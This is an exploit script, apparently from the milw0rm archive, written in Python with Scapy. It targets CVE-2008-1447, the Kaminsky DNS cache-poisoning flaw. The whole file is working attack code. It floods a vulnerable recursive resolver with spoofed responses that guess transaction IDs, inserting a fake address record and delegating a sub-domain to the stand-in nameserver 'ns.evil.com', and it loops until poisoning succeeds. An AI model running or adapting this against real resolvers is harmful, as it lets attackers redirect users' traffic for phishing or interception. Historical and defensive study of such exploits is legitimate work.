from scapy import *
import random

# Copyright (C) 2008 Julien Desfossez <ju@klipix.org>
# http://www.solisproject.net/
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

# This script exploit the flaw discovered by Dan Kaminsky
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447
# http://www.kb.cert.org/vuls/id/800113

# It tries to insert a dummy record in the vulnerable DNS server by guessing
# the transaction ID.
# It also insert Authority record for a valid record of the target domain.

# To use this script, you have to discover the source port used by the vulnerable
# DNS server.
# Python is really slow, so it will take some time, but it works :-)


# IP to insert for our dummy record
targetip = "10.4.0.2"
# Vulnerable recursive DNS server
targetdns = "10.4.1.15"
# Authoritative NS for the target domain
srcdns = ["8.8.8.8"]

# Domain to play with
dummydomain = ""
basedomain = ".test.com."
# sub-domain to claim authority on
domain = "sub.test.com."
# Spoofed authoritative DNS for the sub-domain
spoof="ns.evil.com."
# src port of vulnerable DNS for recursive queries
dnsport = 32883

# base packet
rep = IP(dst=targetdns, src=srcdns[0])/ \
	UDP(sport=53, dport=dnsport)/ \
	DNS(id=99, qr=1, rd=1, ra=1, qdcount=1, ancount=1, nscount=1, arcount=0,
		qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
		an=DNSRR(rrname=dummydomain, ttl=70000, rdata=targetip, rdlen=4),
		ns=DNSRR(rrname=domain, rclass=1, ttl=70000, rdata=spoof, rdlen=len(spoof)+1, type=2)
	)


currentid = 1024
dummyid = 3
while 1:
	dummydomain = "a" + str(dummyid) + basedomain
	dummyid = dummyid + 1
	# request for our dummydomain
	req = IP(dst=targetdns)/ \
	      UDP(sport=random.randint(1025, 65000), dport=53)/ \
	      DNS(id=99, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
			      qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
			      an=0,
			      ns=0,
			      ar=0
		)
	send(req)

	# build the response
	rep.getlayer(DNS).qd.qname = dummydomain
	rep.getlayer(DNS).an.rrname = dummydomain

	for i in range(50):
		# TXID
		rep.getlayer(DNS).id = currentid
		currentid = currentid + 1
		if currentid == 65536:
			currentid = 1024

		# len and chksum
		rep.getlayer(UDP).len = IP(str(rep)).len-20
		rep[UDP].post_build(str(rep[UDP]), str(rep[UDP].payload))

		print "Sending our reply from %s with TXID = %s for %s" % (srcdns[0], str(rep.getlayer(DNS).id), dummydomain)
		send(rep, verbose=0)

	# check to see if it worked
	req = IP(dst=targetdns)/ \
	      UDP(sport=random.randint(1025, 65000), dport=53)/ \
	      DNS(id=99, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
			      qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
			      an=0,
			      ns=0,
			      ar=0
		)
	z = sr1(req, timeout=2, retry=0, verbose=0)
	try:
		if z[DNS].an.rdata == targetip:
			print "Successfully poisonned our target with a dummy record !!"
			break
	except:
		print "Poisonning failed"

# milw0rm.com [2008-07-24]
